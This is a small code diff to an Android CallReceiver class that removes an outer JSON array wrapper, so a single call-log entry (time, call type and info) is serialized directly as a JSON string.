@@ -122,8 +122,6 @@ public class CallReceiver extends BroadcastReceiver {
 		managedCursor.close();
 
 		String sendJSONStr = null;
-		JSONObject jsonObject = new JSONObject();
-		JSONArray data = new JSONArray();
 		JSONObject info = new JSONObject();
 		JSONObject object = new JSONObject();
 		try {
@@ -134,8 +132,6 @@ public class CallReceiver extends BroadcastReceiver {
 			object.put("time", date);
 			object.put("type", callTypeStr);
 			object.put("info", info);
-			data.put(object);
-			jsonObject.put("data", data);
 			// sendJSONStr = jsonObject.toString();
 			sendJSONStr = object.toString();
 		} catch (JSONException e) {
